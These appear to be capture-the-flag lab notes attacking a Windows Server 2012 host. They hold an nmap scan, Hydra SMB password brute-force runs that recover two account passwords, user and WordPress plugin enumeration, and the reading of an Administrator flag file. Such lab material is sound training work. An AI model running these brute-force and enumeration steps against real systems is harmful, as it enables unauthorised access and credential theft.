## 192.168.100.50/Winserver-01
```bash
Nmap scan report for ip-192-168-100-50.us-west-1.compute.internal (192.168.100.50)
Host is up (0.00043s latency).
Not shown: 65521 closed tcp ports (reset)
PORT      STATE SERVICE            VERSION
80/tcp    open  http               Apache httpd 2.4.51 ((Win64) PHP/7.4.26)
|_http-server-header: Apache/2.4.51 (Win64) PHP/7.4.26
|_http-title: WAMPSERVER Homepage
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows Server 2012 R2 Standard 9600 microsoft-ds
3307/tcp  open  opsession-prxy?
| fingerprint-strings: 
|   NULL: 
|_    Host 'ip-192-168-100-5.us-west-1.compute.internal' is not allowed to connect to this MariaDB server
3389/tcp  open  ssl/ms-wbt-server?
| rdp-ntlm-info: 
|   Target_Name: WINSERVER-01
|   NetBIOS_Domain_Name: WINSERVER-01
|   NetBIOS_Computer_Name: WINSERVER-01
|   DNS_Domain_Name: WINSERVER-01
|   DNS_Computer_Name: WINSERVER-01
|   Product_Version: 6.3.9600
|_  System_Time: 2026-01-29T01:09:59+00:00
|_ssl-date: 2026-01-29T01:10:02+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=WINSERVER-01
| Not valid before: 2026-01-27T21:00:02
|_Not valid after:  2026-07-29T21:00:02
5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49160/tcp open  msrpc              Microsoft Windows RPC
49185/tcp open  msrpc              Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3307-TCP:V=7.92%I=7%D=1/29%Time=697AB314%P=x86_64-pc-linux-gnu%r(NU
SF:LL,6A,"f\0\0\x01\xffj\x04Host\x20'ip-192-168-100-5\.us-west-1\.compute\
SF:.internal'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20Ma
SF:riaDB\x20server");
MAC Address: 02:9B:92:B7:BF:CF (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=1/29%OT=80%CT=1%CU=38962%PV=Y%DS=1%DC=D%G=Y%M=029B92%T
OS:M=697AB36B%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10B%TI=I%CI=I%II=I
OS:%SS=S%TS=7)OPS(O1=M2301NW8ST11%O2=M2301NW8ST11%O3=M2301NW8NNT11%O4=M2301
OS:NW8ST11%O5=M2301NW8ST11%O6=M2301ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000
OS:%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M2301NW8NNS%CC=Y%Q=)T1(R=Y%D
OS:F=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0
OS:%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=
OS:A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=
OS:Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=A
OS:R%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%R
OS:UD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 1 hop
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: WINSERVER-01, NetBIOS user: <unknown>, NetBIOS MAC: 02:9b:92:b7:bf:cf (unknown)
| smb2-security-mode: 
|   3.0.2: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows Server 2012 R2 Standard 9600 (Windows Server 2012 R2 Standard 6.3)
|   OS CPE: cpe:/o:microsoft:windows_server_2012::-
|   Computer name: WINSERVER-01
|   NetBIOS computer name: WINSERVER-01\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-01-29T01:09:54+00:00
| smb2-time: 
|   date: 2026-01-29T01:09:56
|_  start_date: 2026-01-28T21:00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

TRACEROUTE
HOP RTT     ADDRESS
1   0.43 ms ip-192-168-100-50.us-west-1.compute.internal (192.168.100.50)

```
```bash
root@kali:~# hydra -l mike -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.168.100.50 smb
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-01-29 18:35:44
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 1009 login tries (l:1/p:1009), ~1009 tries per task
[DATA] attacking smb://192.168.100.50:445/
[445][smb] host: 192.168.100.50   login: mike   password: diamond
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-01-29 18:35:46
```
```bash
root@kali:~# hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.168.100.50 smb
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-01-29 18:37:10
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 1009 login tries (l:1/p:1009), ~1009 tries per task
[DATA] attacking smb://192.168.100.50:445/
[445][smb] host: 192.168.100.50   login: admin   password: superman
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-01-29 18:37:11
root@kali:~# 
```
```bash
C:\wamp64\www\wordpress\wp-content\plugins>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 5CD6-020B

 Directory of C:\wamp64\www\wordpress\wp-content\plugins

04/22/2022  01:21 AM    <DIR>          .
04/22/2022  01:21 AM    <DIR>          ..
04/18/2022  09:14 PM    <DIR>          burger-companion
04/18/2022  09:02 PM                28 index.php
04/18/2022  09:23 PM    <DIR>          wp-file-manager
04/18/2022  09:30 PM    <DIR>          wp-responsive-thumbnail-slider
               1 File(s)             28 bytes
               5 Dir(s)   4,027,895,808 bytes free
```
```bash
C:\Windows\system32>net user
net user

User accounts for \\

-------------------------------------------------------------------------------
admin                    Administrator            DefaultAccount           
Guest                    lawrence                 mary                     
student                  WDAGUtilityAccount       
The command completed with one or more errors.
```
```bash
C:\Windows\system32>type C:\Users\Administrator\flag.txt
type C:\Users\Administrator\flag.txt
19e53755591a4cfeac749f5d5f62d5e2
```